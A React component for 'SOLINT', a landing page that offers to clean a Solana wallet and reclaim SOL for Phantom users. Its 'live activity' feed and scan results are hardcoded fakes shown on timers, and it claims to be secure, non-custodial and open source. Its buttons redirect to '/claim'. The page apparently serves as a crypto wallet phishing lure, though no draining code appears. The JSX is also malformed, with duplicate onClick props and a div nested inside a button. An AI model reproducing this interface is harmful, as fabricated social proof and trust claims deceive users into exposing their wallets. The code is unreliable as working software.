import { useEffect, useMemo, useState } from "react";

export default function SolintUI({ onConnect }: { onConnect: () => void }) {
  const [scanStage, setScanStage] = useState<"idle" | "scanning" | "done">("idle");
  const [accounts, setAccounts] = useState<number | null>(null);
  const [estimatedSol, setEstimatedSol] = useState<string | null>(null);
  const [liveIndex, setLiveIndex] = useState(0);

  const liveItems = useMemo(
    () => [
      "0.021 SOL reclaimed just now",
      "0.084 SOL reclaimed 2 min ago",
      "12 unused accounts found 4 min ago",
      "0.037 SOL reclaimed 6 min ago",
    ],
    []
  );

  useEffect(() => {
    const id = setInterval(() => {
      setLiveIndex((prev) => (prev + 1) % liveItems.length);
    }, 2800);
    return () => clearInterval(id);
  }, [liveItems.length]);

  useEffect(() => {
    if (scanStage !== "scanning") return;

    const t1 = setTimeout(() => {
      setAccounts(14);
      setEstimatedSol("0.08 SOL");
    }, 1200);

    const t2 = setTimeout(() => {
      setScanStage("done");
    }, 2200);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, [scanStage]);

  const handleScan = () => {
    setScanStage("scanning");
    setAccounts(null);
    setEstimatedSol(null);
    onConnect();
  };

  return (
    <div
      style={{
        minHeight: "100vh",
        background:
          "radial-gradient(circle at 78% 18%, rgba(168,85,247,0.28), transparent 0 26%), radial-gradient(circle at 18% 82%, rgba(99,102,241,0.12), transparent 0 22%), #030303",
        color: "white",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        position: "relative",
        overflow: "hidden",
        padding: "32px",
        fontFamily:
          'Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
      }}
    >
      <div
        style={{
          position: "absolute",
          inset: 0,
          background:
            "radial-gradient(circle at top right, rgba(168,85,247,0.18), transparent 0 30%)",
          filter: "blur(80px)",
          pointerEvents: "none",
        }}
      />

      <div
        style={{
          position: "relative",
          zIndex: 2,
          width: "100%",
          maxWidth: "1240px",
          display: "grid",
          gridTemplateColumns: "1.1fr 0.9fr",
          gap: "48px",
          alignItems: "center",
        }}
      >
        <div>
          <div
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "10px",
              padding: "10px 14px",
              borderRadius: "999px",
              background: "rgba(255,255,255,0.04)",
              border: "1px solid rgba(255,255,255,0.08)",
              color: "#c9b5ff",
              fontSize: "14px",
              marginBottom: "22px",
              backdropFilter: "blur(12px)",
            }}
          >
            <span
              style={{
                width: "8px",
                height: "8px",
                borderRadius: "999px",
                background: "#22c55e",
                boxShadow: "0 0 18px rgba(34,197,94,0.8)",
              }}
            />
            Non-custodial • Secure • Open source
          </div>

          <h1
            style={{
              fontSize: "76px",
              lineHeight: 0.98,
              letterSpacing: "-0.04em",
              fontWeight: 800,
              margin: 0,
            }}
          >
            Clean your{" "}
            <span
              style={{
                background: "linear-gradient(90deg, #c084fc, #8b5cf6 55%, #7c3aed)",
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent",
              }}
            >
              Solana wallet
            </span>{" "}
            in seconds.
          </h1>

          <p
            style={{
              marginTop: "24px",
              color: "rgba(255,255,255,0.72)",
              fontSize: "24px",
              lineHeight: 1.45,
              maxWidth: "700px",
            }}
          >
            Scan and remove unused token accounts instantly with a cleaner, more
            trusted experience.
          </p>

          <div style={{ display: "flex", gap: "14px", marginTop: "34px", flexWrap: "wrap" }}>
            <button onClick={() => window.location.href="/claim"}
              onClick={handleScan}
              style={{
                padding: "17px 30px",
                borderRadius: "14px",
                border: "none",
                color: "white",
                cursor: "pointer",
                fontSize: "19px",
                fontWeight: 700,
                background: "linear-gradient(90deg, #7c3aed, #a855f7)",
                boxShadow: "0 0 34px rgba(168,85,247,0.45)",
              }}
            >
              {scanStage === "scanning" ? "Scanning..." : "Scan your wallet"}

          <div style={{ marginTop: "12px", color: "rgba(255,255,255,0.6)", fontSize: "14px" }}>⚡ Avg reclaim: 0.02–0.12 SOL per wallet</div>
            </button>

            <div
              style={{
                display: "flex",
                alignItems: "center",
                padding: "0 16px",
                borderRadius: "14px",
                border: "1px solid rgba(255,255,255,0.1)",
                background: "rgba(255,255,255,0.03)",
                color: "rgba(255,255,255,0.72)",
                fontSize: "15px",
                backdropFilter: "blur(10px)",
              }}
            >
              Built for Phantom users
            </div>
          </div>

          <div
            style={{
              marginTop: "28px",
              padding: "14px 16px",
              borderRadius: "14px",
              background: "rgba(255,255,255,0.035)",
              border: "1px solid rgba(255,255,255,0.08)",
              color: "rgba(255,255,255,0.78)",
              maxWidth: "520px",
              backdropFilter: "blur(12px)",
              minHeight: "52px",
              display: "flex",
              alignItems: "center",
            }}
          >
            <span style={{ color: "#22c55e", marginRight: "10px" }}>●</span>
            Live activity: {liveItems[liveIndex]}
          </div>
        </div>

        <div
          style={{
            position: "relative",
            borderRadius: "28px",
            padding: "26px",
            background: "linear-gradient(180deg, rgba(18,18,22,0.94), rgba(8,8,10,0.96))",
            border: "1px solid rgba(168,85,247,0.28)",
            boxShadow:
              "0 24px 80px rgba(0,0,0,0.55), 0 0 0 1px rgba(255,255,255,0.02) inset, 0 0 80px rgba(124,58,237,0.16)",
            backdropFilter: "blur(18px)",
          }}
        >
          <div
            style={{
              position: "absolute",
              inset: "-1px",
              borderRadius: "28px",
              pointerEvents: "none",
              background:
                "linear-gradient(135deg, rgba(168,85,247,0.28), transparent 35%, transparent 65%, rgba(56,189,248,0.12))",
              maskImage:
                "linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0)",
              WebkitMaskImage:
                "linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0)",
              padding: "1px",
              WebkitMaskComposite: "xor",
              maskComposite: "exclude",
            }}
          />

          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: "16px", color: "rgba(255,255,255,0.65)" }}>SOLINT</div>
              <div style={{ fontSize: "34px", fontWeight: 800, marginTop: "4px" }}>
                {scanStage === "done"
                  ? "Scan complete"
                  : scanStage === "scanning"
                  ? "Scanning wallet..."
                  : "Scan preview"}
              </div>
            </div>

            <div
              style={{
                width: "60px",
                height: "60px",
                borderRadius: "999px",
                border: "2px solid rgba(34,197,94,0.8)",
                display: "grid",
                placeItems: "center",
                color: "#34d399",
                fontSize: "28px",
                boxShadow: "0 0 26px rgba(16,185,129,0.2)",
              }}
            >
              {scanStage === "scanning" ? "⋯" : "✓"}
            </div>
          </div>

          <div
            style={{
              marginTop: "18px",
              color: "rgba(255,255,255,0.7)",
              fontSize: "18px",
              minHeight: "28px",
            }}
          >
            {scanStage === "idle" && "Ready to scan your wallet"}
            {scanStage === "scanning" && "Looking for unused token accounts..."}
            {scanStage === "done" && "We found unused token accounts ready to clean"}
          </div>

          <div
            style={{
              marginTop: "26px",
              display: "grid",
              gap: "14px",
            }}
          >
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                padding: "18px 18px",
                borderRadius: "18px",
                background: "rgba(255,255,255,0.03)",
                border: "1px solid rgba(255,255,255,0.06)",
              }}
            >
              <div>
                <div style={{ fontSize: "15px", color: "rgba(255,255,255,0.58)" }}>
                  Unused token accounts
                </div>
                <div style={{ marginTop: "6px", fontSize: "20px", fontWeight: 700 }}>
                  {scanStage === "scanning" ? "Scanning..." : accounts ?? "--"}
                </div>
              </div>
              <div style={{ color: "#a855f7", fontWeight: 800, fontSize: "28px" }}>
                {scanStage === "done" ? accounts : "—"}
              </div>
            </div>

            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                padding: "18px 18px",
                borderRadius: "18px",
                background: "rgba(255,255,255,0.03)",
                border: "1px solid rgba(255,255,255,0.06)",
              }}
            >
              <div>
                <div style={{ fontSize: "15px", color: "rgba(255,255,255,0.58)" }}>
                  Estimated SOL
                </div>
                <div style={{ marginTop: "6px", fontSize: "20px", fontWeight: 700 }}>
                  {scanStage === "scanning" ? "Calculating..." : estimatedSol ?? "--"}
                </div>
              </div>
              <div style={{ color: "#22d3ee", fontWeight: 800, fontSize: "28px" }}>
                {scanStage === "done" ? estimatedSol : "—"}
              </div>
            </div>
          </div>

          <button onClick={() => window.location.href="/claim"}
            onClick={handleScan}
            style={{
              marginTop: "24px",
              width: "100%",
              padding: "18px 20px",
              borderRadius: "18px",
              border: "none",
              cursor: "pointer",
              color: "white",
              fontSize: "20px",
              fontWeight: 700,
              background: "linear-gradient(90deg, #7c3aed, #a855f7)",
              boxShadow: "0 0 30px rgba(168,85,247,0.35)",
            }}
          >
            {scanStage === "done" ? "Scan again" : scanStage === "scanning" ? "Scanning..." : "Start scan"}
          </button>
        </div>
      </div>
    </div>
  );
}
